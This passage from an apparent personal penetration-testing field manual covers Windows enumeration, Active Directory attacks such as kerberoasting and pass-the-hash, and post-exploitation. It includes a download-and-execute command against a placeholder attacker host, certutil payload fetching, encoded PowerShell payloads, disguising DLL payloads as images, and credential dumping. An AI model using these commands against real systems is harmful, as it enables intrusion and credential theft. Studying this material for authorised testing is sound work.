<pre><code>Get-ChildItem C:\\* -recurse | Select-String -pattern SEARCH_TERM\n</code></pre>"},{"location":"windows/win_enumeration/#exfiltration-through-the-screen","title":"exfiltration through the screen","text":"<p>Provided file size is small enough, set a variable <code>$path = \"C:\\Path\\To\\file\"</code> then put the following prepared statement into the shell</p> <pre><code>$b64 = (Get-Content -Path $path -Encoding byte); [convert]::ToBase64String($b64)\n</code></pre> <p>Note that the resulting b64 is in <code>utf-16le</code> and should be converted with the <code>iconv</code> utility before further usage. </p>"},{"location":"windows/win_enumeration/#using-common-scripts","title":"using common scripts","text":""},{"location":"windows/win_enumeration/#execution-without-touching-disk","title":"execution without touching disk","text":"<ol> <li>host the <code>script.ps1</code> </li> <li>edit the <code>script.ps1</code> file to call w.e. function you want by placing the function call, including arguments, at the end of this file. This is often the reverse shell.</li> <li>use <code>IEX(new-object net.webClient).downloadString('http://attacker.com/script.ps1')</code> </li> </ol>"},{"location":"windows/win_enumeration/#execution-with-touching-disk","title":"execution with touching disk","text":"<p><code>PowerUp.ps1</code> is used as an example</p> <pre><code>-ep bypass\nimport-module powerup.ps1 # or w.e u named it\ninvoke-allchecks          # this is a method defined in powerup.ps1\n</code></pre>"},{"location":"windows/win_enumeration/#legacy-reference-first-attempts-at-learning-enumeration","title":"legacy reference  - first attempts at learning enumeration","text":"<p>Flailing about. This section holds notes created when first studying Windows Enumeration. It is disorganized and ineffective for operations. Leaving it here to demonstrate growth and as reference for writing. Not likely to be referenced during campaigns. </p> <p>bullet points</p> <ul> <li><code>C:/windows/tasks</code>     -   is a common (ALL) READ/WRITE directory</li> <li>winPEAS exists</li> <li>seatbelt exists</li> <li><code>find</code> command exists, does it ? YES</li> <li><code>cacls FILENAME</code>  access control lists; deprecated but sometimes has info</li> </ul>"},{"location":"windows/win_enumeration/#notable-files","title":"notable files","text":"<p>etc hosts</p> <pre><code>c:\\Windows\\System32\\Drivers\\etc\\hosts\n</code></pre> <p>powershell history</p> <pre><code>C:\\Users\\%userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\n</code></pre>"},{"location":"windows/win_enumeration/#the-classics","title":"the classics","text":"<pre><code>systeminfo\n\nwmic qfe get Caption, Description\n; installed updates, hotfixes etc\n\nnet start\n; started and installed services\n\nwmic product get name,version,vendor\n; installed apps\n\nwhoami /all  # (includes, /privs and /groups)\nnet user, net user /domain\nnet localgroup, net localgroup  GROUPNAME\n\nnet account, net accounts /domain  \n; Get password policy info, among other stuff\n\n</code></pre> <p>note that most of these are alarmed by the SIEM, especially those which enumerate the domain. powershell equivalents might be the way to go?</p>"},{"location":"windows/win_enumeration/#network","title":"network","text":"<p>ports in use; all, binary(name of exe), no-resolve numbers, PID</p> <pre><code>netstat /?\nnetstat -abno\n# -b is the valuable flag here, resolves binary name\n</code></pre> <p>network interfaces, is this multi-homed?</p> <pre><code>ipconfig\n</code></pre> <p>discover peers via pingsweep</p> <pre><code>PINGSWEEP SCRIPT, or manually\nping -a the results\n</code></pre> <p>discovery peers, alternative to pingsweep, MAY BE ALARMED</p> <pre><code>arp -a\n</code></pre> <p>host file, may reveal information</p> <pre><code>c:\\Windows\\System32\\Drivers\\etc\\hosts\n</code></pre>"},{"location":"windows/win_enumeration/#cmd","title":"cmd","text":"<p>when enumerating through RCE; particularly useful for pulling/serving with certutil</p> <pre><code>cmd.exe /C                                                                          ; executes a command in cmd.exe, similar to powershell -c\ncmd.exe /C certutil -urlcache -split -f http://&lt;MY_IP&gt;/NAME_FILE.exe OUTFILE.exe    ; example of serving\n</code></pre> <p>basic enumerations; drop these commands when you initially land</p> <pre><code>powershell&gt; dir env:                                ; list env vars for current user; excellent info here\nwhoami /all  (or /priv)\nsysteminfo\ntype C:\\Users\\USER_NAME\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt\n</code></pre> <p>serving files </p> <pre><code>certutil -urlcache -split -f http://&lt;MY_IP&gt;/NAME_FILE.exe OUTFILE.exe               ; may not needs -split\n</code></pre>"},{"location":"windows/win_facts/","title":"win_facts","text":"<p>sort these as the field manual develops</p>"},{"location":"windows/win_facts/#hashing-on-windows","title":"hashing on windows","text":"<p>NTLM hashes</p> <pre><code>LM:NTLM                     ; lan man : new technology lan manager\naad3...:31d6...             ; blank hashes\n</code></pre> <p>explanation of above</p> <pre><code>LM is no longer used but is often required for interacting with services; Anything can be put here! So long as its a valid hash\n</code></pre>"},{"location":"windows/win_facts/#default-windows-encoding","title":"default windows encoding","text":"<p>default encoding</p> <pre><code>UTF-16le            ; UTF-8 little endian\n\nNECESSARY FOR POWERSHELL ENCODED COMMANDS\n</code></pre> <p>encoding the payload</p> <pre><code>echo -n 'IEX(IWR....)' | iconv -t UTF-16LE | base64 -w 0\n\nexplanation:\n    echo is the ps command we doing, new object, invoke-web, w.e.\n    -t ; to code\n    -w 0 ; all on 1 line\n</code></pre> <p>detonating the payload</p> <pre><code>powershell -enc 'BASE64_ENCODED_COMMAND'\n</code></pre>"},{"location":"windows/win_facts/#microsoft-binaries","title":"microsoft binaries","text":""},{"location":"windows/win_facts/#where","title":"where","text":"<p>This binary acts almost identically to linux's <code>which</code>. The following gives the absolte path of <code>whoami.exe</code>.</p> <pre><code>where whoami\n</code></pre>"},{"location":"windows/win_facts/#findstr","title":"findstr","text":"<p>Similar to <code>grep</code>, usage of the <code>findstr</code> binary is a fundamental skill. The following searches <code>STDOUT</code> for strings that do not contain <code>\"windows\"</code>, ignoreing case sensitivity.</p> <pre><code>| findstr /v /i \"C:\\Windows\"\n</code></pre>"},{"location":"windows/win_facts/#regsrv32","title":"regsrv32","text":"<p>This <code>regsrv32</code> binary will execute <code>.DLL</code> files. It does not care about the extension, it reads the binary header instead. First mask the payload as a <code>.DAT</code> or <code>.JPG</code> before execution. </p>"},{"location":"windows/win_facts/#cscript","title":"cscript","text":"<p>The <code>cscript</code> binary is the parser for scripts. Similar to <code>wscript</code>, but without abilities to make windows. Notably, <code>cscript</code> will parse javascript. This enables <code>.js</code> payloads to be used on targets. </p>"},{"location":"windows/win_killchain/","title":"win_killchain","text":"<ul> <li>identify target is windows</li> <li>identify vuln</li> <li>weaponize the vuln</li> <li>exploit / detonate the weapon</li> <li>Initial Access</li> <li>System/Administrator Group (Required for Hashdumping)</li> <li>mimkatz</li> <li>dump hashes (via reg save or mimikatz; then dump locally)</li> <li>horizontal escallation/pivot</li> </ul>"},{"location":"windows/win_killchain/#claim-some-territory","title":"claim some territory","text":"<p>world writable</p> <pre><code>%AppData%\nusually is C:\\Users\\USER_NAME\\AppData\\Roaming\n\nC:\\windows\\tasks\n\nC:\\temp\n</code></pre>"},{"location":"windows/win_toolset/","title":"win_toolset","text":"<p>tools for attacking windows</p> <pre><code>responder.py            ; trick victim into reaching out to me, victim tries auth via hash, responder captures hash\npsexec.py               ; a possible shell, not available for all groups, smb related\nevil-winrm              ; port 5985 or win rm service must be running\n</code></pre> <p>smbclient ; not a pentesting tool</p> <pre><code>smbclient -U '' -P '' //$ip/SHARE       ; is NULL authentication\nsmbclient -L //$ip                      ; is list shares\n</code></pre> <p>crackmapexec  ; sharing services swiss army knife ?</p> <pre><code>enumerate all kinds of services\nfrequently used for FTP\nprivided with creds it will verify and return to me what is writable/readable\n\ntool is for\n    enumeration\n    bruteforce\n    access (shells)\n\nmore experience with this tool is necessary, its a huge toolbox\n</code></pre> <p>the entire IMPACKET library; located in my opt directory b.c my first install was bad; checkout EXAMPLES folder</p> <pre><code>this entire library has excellent tools for acheiving our goals\ntoo much to describe\n\nhighlights\n    SMBServer.py\n        host smb server on my attacking linux vm to send files to attacking windows for further analysis\n        see -h for host setup\n        on windows:  win+r \\\\HOST_IP\\SHARENAME to access share\n    Get-AD-users.py\n        tool for bruteforcing RIDs to enumerate AD users\n    secretsdump.py\n        alternative to mimikatz? same idea, dump hashes from SAM once you have a system acc\n        first harvest hashes via\n            \"reg save HKLM\\system\"\n            \"reg save HKLM\\sam\"\n</code></pre>"},{"location":"windows/active-directory/active-directory-fundamentals/","title":"active-directory-fundamentals","text":"<p>The intention of this section is to give an overview of concepts. Specific attack techniques each get their own page.</p> <p>The goal of Active Directory is to provide domain services to a network (AD DS). This can be thought of as a phonebook or database, or an enterprise's organization chart. Concepts such as authority, access control, networking, and much more can be implemented into computer networks based of the information present in the directory. </p> <p>This is an attractive attack surface because if you can control the information inside active directory, then you have control over the environment. </p>"},{"location":"windows/active-directory/active-directory-fundamentals/#semantics-domain-vs-workgroup","title":"Semantics: Domain VS Workgroup","text":"<ul> <li> <p>default domain is <code>WORKGROUP</code> or <code>HOSTNAME</code></p> </li> <li> <p>WORKGROUP is a LAN of peer to peer machines</p> <ul> <li>Microsoft term for any network of peer2peer machines</li> <li>emphasis on PEER; no computer controls others</li> <li>each computer has its own user accounts</li> <li>all devices are part of same subnet</li> <li>limited to 10-20 devices, smaller counts overall</li> </ul> </li> <li> <p>DOMAIN is a network of objects that share the same Active Directory Databases</p> <ul> <li>accounts are DOMAIN wide</li> <li>any device part of domain will acknowledge the account, provided policy</li> <li>there is a domain controller, a DC. Acts as a server to control member objects of the AD</li> <li>devices can be on differing subnets but be part of same DOMAIN</li> <li>100-1000+ devices, </li> </ul> </li> </ul>"},{"location":"windows/active-directory/active-directory-fundamentals/#physical-traits-of-active-directory","title":"Physical Traits of Active-Directory","text":""},{"location":"windows/active-directory/active-directory-fundamentals/#domain-controllers","title":"Domain Controllers","text":"<ul> <li>hosts a copy of the AD DS directory store</li> <li>provides authentication/authorization service for the domain</li> <li>replication, updates to one DC propagate throughout the domain and forest</li> <li>admin access to manage user accounts and network resources</li> </ul>"},{"location":"windows/active-directory/active-directory-fundamentals/#active-directory-data-store","title":"Active Directory Data Store","text":"<p>The AD DS data store is the database files and processes that make up Active Directory. The AD DS data store is the \"crown jewels\" of the \"vip\". Protecting/looting these files is the primary objective when considering the domain controller. </p> <p>Traits of AD DS data store:</p> <ul> <li>file named  <code>ntds.dit</code>, the crown jewels</li> <li>stored in <code>%SystemRoot%\\NTDS</code> folder </li> <li>includes password hashes</li> <li>includes all other Active Directory data too</li> </ul>"},{"location":"windows/active-directory/active-directory-fundamentals/#logical-components-of-active-directory","title":"Logical Components of Active-Directory","text":"<p>This section mostly of definitions and brief notes.</p>"},{"location":"windows/active-directory/active-directory-fundamentals/#ad-ds-schema","title":"AD DS Schema","text":"<p>Enforces rules about object creation</p> <p>This contains definitions of objects that can be created. Want to create a user object? The definition exists as part of the AD DS Schema. Which attributes is an object allowed to have? This is defined here too. The AD DS Schema is exhaustive, if a definition for an object, a prototype, does not exist within it then the object cannot be created. </p>"},{"location":"windows/active-directory/active-directory-fundamentals/#objects","title":"Objects","text":"<p>the fundamental unit, the elements that we will collect, organize and build things with</p> <p>examples</p> <ul> <li>Users: enables network resource access</li> <li>InetOrgPerson: similar to user, used for compatibility</li> <li>Contacts: No network access, enables assigning emails to external users</li> <li>Groups: Administrative tool, form collections of objects, theses are similar to Organizational Units</li> <li>Computers: Enables authentication and auditing of access to resources</li> <li>Printers: physical office, convenience feature for location and use of printers</li> <li>Shared folders: enable users to search for shared folders based off of properties</li> </ul> <p>Note that nesting is possible with some of these objects. e.g. a computer can be a member of a group. This feature opens some interesting methods of persistence and evasion, and therefore some important considerations for defenders. </p>"},{"location":"windows/active-directory/active-directory-fundamentals/#organizational-units-ous","title":"Organizational Units (OUs)","text":"<p>collections which contain any object defined in the AD DS schema. OUs can also contain other OUs. </p> <p>This is our first collection that also has an Action associated with it. OUs are the means that allow the management of objects.</p> <p>OUs are used to:</p> <ul> <li>represent organization hierarchically and logically</li> <li>delegate permission to administer collections of objects</li> <li>apply policies, often through inheritance (e.g. nested OUs)</li> </ul>"},{"location":"windows/active-directory/active-directory-fundamentals/#domains","title":"Domains","text":"<p>Domains are collections of objects belonging to an organization</p> <ul> <li>acts as an administrative boundary</li> <li>replication boundary between domain controllers</li> <li>authentication and authorization boundary, a way to limit scope of access to resources</li> </ul>"},{"location":"windows/active-directory/active-directory-fundamentals/#trees","title":"Trees","text":"<p>Trees are collections of domains</p> <ul> <li>respects a hierarchy structure, parent child relationships between domains</li> <li>by default, a two-way transitive trust exists between domains in the same tree. If a path on the graph exists, we have have bidirectional trust</li> <li>can be identified by contiguous namespace with the parent domain</li> <li>acts very similarly to domain/subdomain found in URLs</li> </ul>"},{"location":"windows/active-directory/active-directory-fundamentals/#forests","title":"Forests","text":"<p>Forests are collections of Trees</p> <ul> <li>Think of two graphs with a central shared node. A path between trees must exist</li> <li>Enables trusts between all domains in the Trees of the Forest (unknown default behavior)</li> <li>all trees share:<ul> <li>common schema</li> <li>common configuration partition</li> <li>common global catalog. think LDAP</li> <li>Enterprise Admins and Schema Admins groups</li> </ul> </li> </ul>"},{"location":"windows/active-directory/active-directory-fundamentals/#trusts","title":"Trusts","text":"<p>this is how users access resources in another domain, there are two principal types of trust</p> <ol> <li> <p>Directional</p> <ul> <li>Can be bidirectional or unidirectional</li> <li>If domain A trust domain B then domain B can access resources in domain A</li> </ul> </li> <li> <p>Transitive</p> <ul> <li>This is how we include more than two domains in a \"Trust Tree\"</li> <li>If A trusts B and B trusts C, then A trusts C</li> </ul> </li> </ol> <p>Some general features of trusts:</p> <ul> <li>All domains in a forest trust each other by default</li> <li>Trusts can extend outside the forest</li> </ul>"},{"location":"windows/active-directory/if_then_enumerations/","title":"if_then_enumerations","text":""},{"location":"windows/active-directory/if_then_enumerations/#can-read-netlogon-and-sysvol","title":"Can Read Netlogon and Sysvol","text":"<p>If can read Netlogon and Sysvol then run <code>bloodhound.py</code></p> <pre><code>python3 bloodhound.py --dns-tcp -ns $ip -d target.com -u 'USER' -p 'PASSWORD'\n</code></pre> <p>Note that all variations such as <code>target.com</code> , <code>dc.target.com</code>,  and <code>dc01.target.com</code> must be added to the <code>/etc/hosts</code> to avoid issues with the impacket library. Pay attention to this step, errors can cause severe loss of time. </p>"},{"location":"windows/active-directory/index-of-active-directory/","title":"Index of active directory","text":"<ul> <li>active-directory-fundamentals</li> <li>kerberoasting-and-other-hash-attacks</li> <li>ldap</li> <li>if_then_enumerations</li> </ul>"},{"location":"windows/active-directory/kerberoasting-and-other-hash-attacks/","title":"kerberoasting-and-other-hash-attacks","text":""},{"location":"windows/active-directory/kerberoasting-and-other-hash-attacks/#creating-initial-userlists","title":"Creating Initial Userlists","text":"<p>If passive recon fails to populate userlists, then we can populate a userlist by bruteforcing RIDs. Try with all of the following:  <code>Guest</code> , <code>''</code> (NULL) , and <code>anonymous</code>  (non-existent user and any pass) authentication. </p> <pre><code>lookupsid.py Guest@$ip \n</code></pre> <pre><code>lookupsid.py ''@$ip \n</code></pre>"},{"location":"windows/active-directory/kerberoasting-and-other-hash-attacks/#traditional-kerberoasting-service-principal-names","title":"Traditional Kerberoasting - Service Principal Names","text":"<p>Accounts with a \"Service Principal Name\", an SPN,  have the feature such that any member of the domain can request a service ticket for the account that has an SPN. These accounts are generally known as \"service logon accounts\". The presence of this SPN attribute results in us being able to request a service ticket, the hash, that can then be brute forced with hashcat in order to recover the password. The <code>Guest</code> account cannot ask for an SPN or list accounts which have an SPN. </p> <p>List Users with SPNs</p> <pre><code>GetUserSPNs.py DOMAIN/USER:PASSWORD@$ip\n</code></pre> <p>Get the ticket associated to an SPN</p> <pre><code>GetSPN.py -h\n</code></pre> <p>Here is a list of nice reads or viewings on the topic</p> <ul> <li>risk3sixty | explain SPN kerberoasting</li> </ul>"},{"location":"windows/active-directory/kerberoasting-and-other-hash-attacks/#as-rep-roasting-no-preauthentication-required","title":"AS REP Roasting - No PreAuthentication Required","text":"<p>AS REP Roasting is an offline brute force attack on the AS Reply hash provided by the Kerberos Protocol. In order to request an AS Reply hash for a user, the AD user must have the \"PreAuthentication not required\" trait. This trait is extremely uncommon in the wild. However, it exists and may be implemented in the AD networks we are interested in. </p> <pre><code>GetNPUsers.py DOMAIN -usersfile USERS.LIST -no-pass -dc-ip $ip\n</code></pre> <p>Here is a list of nice reads or viewings on the topic</p> <ul> <li>kerberos pre-auth | VbScrub - youtube</li> </ul>"},{"location":"windows/active-directory/kerberoasting-and-other-hash-attacks/#pass-the-hash","title":"Pass the Hash","text":"<p>Generally the \"post exploitation\" of a successful <code>secretdump.py</code> or other <code>mimikatz</code> like dumping of creds from Local Security Authority Subsystem <code>lsass.exe</code> process, Security Accounts Manager <code>SAM</code>, Credential manager <code>CredMan</code>, or even <code>ntds.dit</code> database. </p> <ul> <li>The resulting hashes can be used to spray across the environment for further access.</li> <li>Hash-based authentication like this is not always possible, it can be explicitly disabled.</li> <li>Alternatively, if username/password authentication fails, hash based authentication should be attempted too in order to cover edge cases. User-pass disabled, hash enabled.</li> </ul> <pre><code>wmiexec.py -hashes LM-HASH:NTLM-HASH USER@$ip\n</code></pre> <p>Other tools which enable hash-based authentication attempts</p> <ul> <li><code>smbexec.py</code></li> <li><code>evil-winrm</code></li> <li><code>crackmapexec</code></li> </ul>"},{"location":"windows/active-directory/kerberoasting-and-other-hash-attacks/#silver-tickets-under-construction","title":"Silver Tickets - under construction","text":"<p>This is usually \"post exploitation\" of a successful initial kerberoast. We can use the password looted from a successful roast of a hash, compute the NTLM of that pass, get the Domain SID (it is prefix to a user SID), then we can get our silver ticket. </p> <p>services generally vulnerable to silver ticket attacks</p> <ul> <li>mssql service</li> </ul>"},{"location":"windows/active-directory/kerberoasting-and-other-hash-attacks/#golden-tickets-under-construction","title":"Golden Tickets - under construction","text":"<p>I have awareness of this but cannot explain it at this time ...</p>"},{"location":"windows/active-directory/kerberoasting-and-other-hash-attacks/#external-cheatsheets-lists","title":"External Cheatsheets &amp; Lists","text":"<ul> <li>kerberos cheatsheet  | TarlogicSecurity</li> </ul>"},{"location":"windows/active-directory/ldap/","title":"ldap","text":""},{"location":"windows/active-directory/ldap/#commonly-abused-fields","title":"commonly abused fields","text":"<p>These fields are commonly abused by people when interacting with Active Directory. they are</p> <ul> <li>info</li> <li>description</li> <li>notes</li> <li>telephones</li> </ul> <p>Examples of abuse include</p> <ul> <li>explicit passwords</li> <li>changelogs</li> <li>password policy</li> <li>various other intelligence, pay attention</li> </ul>"},{"location":"windows/win_post_exploitation/Introduction/","title":"Post Exploitation","text":"<p>These pages are guidelines for activity once Administrator or System has been achieved on a Windows host. These activities either directly achieve the objective or support continuing the pursuit of it. </p> <p>Actions should be taken in concentric circles, originating from the host we now own. The happy path is loosely as follows:</p> <ol> <li>Enumerate local defenses</li> <li>Create ad hoc networks</li> <li>Loot credentials from the owned host</li> <li>Intelligence collection targeting hosts, identities, or the objective</li> <li>Enumerate local network</li> <li>Target selection</li> </ol> <p>Divergence from the happy path should be done deliberately. Do not attempt to justify the decision based off results. If the strategic merits of a choice cannot be shown, then the choice probably should not be made.</p>"}]}